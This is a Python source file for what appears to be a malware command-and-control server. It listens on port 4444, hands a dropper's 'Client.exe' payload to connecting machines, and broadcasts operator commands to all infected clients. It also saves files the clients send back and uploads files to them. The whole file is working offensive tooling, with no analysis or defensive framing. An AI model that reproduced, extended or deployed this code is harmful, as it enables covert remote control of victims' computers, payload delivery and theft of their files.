import socket
import threading
import os


class Server:
    def __init__(self, bind_ip="0.0.0.0", bind_port=4444):
        self.bind_ip = bind_ip
        self.bind_port = bind_port
        self.clients = []           # list of connected client sockets
        self.clients_lock = threading.Lock()

    # ------ Send message with length prefix ------
    def send_msg(self, sock, msg):
        data = msg.encode('utf-8')
        size = len(data).to_bytes(4, 'big')
        sock.sendall(size + data)

    # ------ Receive exact bytes ------
    def recv_exact(self, sock, n):
        data = b""
        while len(data) < n:
            chunk = sock.recv(n - len(data))
            if not chunk:
                raise ConnectionError("Client disconnected")
            data += chunk
        return data

    # ------ Receive full message ------
    def recv_msg(self, sock):
        size_bytes = self.recv_exact(sock, 4)
        size = int.from_bytes(size_bytes, 'big')
        data = self.recv_exact(sock, size)
        return data.decode('utf-8')

    # ------ Handle one client ------
    def client_handler(self, client_socket, addr):
        print(f"[+] Client connected: {addr}")

        while True:
            try:
                msg = self.recv_msg(client_socket)
                
                # --- Handle Dropper Request ---
                if msg == "REQ_PAYLOAD":
                    try:
                        with open("Client.exe", "rb") as f:
                            payload_data = f.read()
                        self.send_msg(client_socket, str(len(payload_data)))
                        client_socket.sendall(payload_data)
                        print(f"[+] Sent payload.exe to {addr}")
                    except FileNotFoundError:
                        print("[-] Error: payload.exe not found on server.")
                    return # Dropper disconnects after download

                # --- Handle File Download from Client ---
                if msg.startswith("FILE:"):
                    self.handle_file_download(client_socket, msg, addr)
                    continue

                print(f"\n--- Output from {addr} ---")
                print(msg)
                print("--------------------------")
            except ConnectionError:
                print(f"[-] Client disconnected: {addr}")
                with self.clients_lock:
                    self.clients.remove(client_socket)
                client_socket.close()
                break

    def handle_file_download(self, sock, header, addr):
        _, filename, filesize = header.split(":")
        filesize = int(filesize)
        print(f"[*] Receiving {filename} ({filesize} bytes) from {addr}...")
        data = self.recv_exact(sock, filesize)
        with open(f"server_{filename}", "wb") as f:
            f.write(data)
        print(f"[+] File saved as server_{filename}")

    # ------ Main server loop ------
    def start(self):
        server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_sock.bind((self.bind_ip, self.bind_port))
        server_sock.listen(5)

        print(f"[+] Server listening on {self.bind_ip}:{self.bind_port}")

        # Thread to send commands to clients
        threading.Thread(target=self.command_input_loop, daemon=True).start()

        # Accept clients
        while True:
            client_socket, addr = server_sock.accept()
            with self.clients_lock:
                self.clients.append(client_socket)

            t = threading.Thread(target=self.client_handler, args=(client_socket, addr), daemon=True)
            t.start()

    # ------ Input loop to send commands ------
    def command_input_loop(self):
        while True:
            cmd = input("Command > ")

            if not cmd.strip():
                continue

            # --- Handle File Upload to Client (put) ---
            if cmd.startswith("put "):
                try:
                    filename = cmd.split()[1]
                    if not os.path.exists(filename):
                        print(f"[-] File {filename} not found.")
                        continue
                    with open(filename, "rb") as f:
                        file_data = f.read()
                    cmd = f"put {filename} {len(file_data)}" # Update cmd to include size
                except Exception as e:
                    print(f"Error preparing file: {e}")
                    continue
            else:
                file_data = None

            with self.clients_lock:
                if not self.clients:
                    print("No connected clients.")
                    continue

                for sock in self.clients:
                    try:
                        self.send_msg(sock, cmd)
                        if file_data:
                            sock.sendall(file_data)
                    except:
                        print("Failed to send command to a client.")
if __name__ == "__main__":
    server = Server()
    server.start()
    